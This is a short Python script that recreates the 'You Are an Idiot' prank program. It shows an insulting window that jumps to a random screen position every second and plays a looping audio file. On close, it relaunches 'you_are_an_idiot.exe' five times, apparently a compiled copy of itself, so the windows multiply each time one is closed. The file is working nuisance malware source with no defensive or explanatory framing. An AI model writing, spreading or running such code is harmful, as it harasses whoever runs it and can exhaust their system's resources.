from tkinter import *
import threading
import random
from time import sleep
import pygame.mixer
import os
cwd = os.getcwd()

def movethread():
    global screen_width
    global screen_height
    while True:
        try:
            root.geometry("200x200+"+str(random.randint(0,screen_width-200))+"+"+str(random.randint(0,screen_height-200)))
        except:
            break
        sleep(1)

pygame.mixer.init()
pygame.mixer.music.load("idiot.mp3")
pygame.mixer.music.play(loops=-1)
root = Tk()
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
lbl = Label(root,text="     You are an idiot!      \n")
lbl.pack()
threading.Thread(target=movethread,name="moveThread").start()
root.mainloop()
pygame.mixer.quit()
for i in range(5):
    os.startfile("you_are_an_idiot.exe")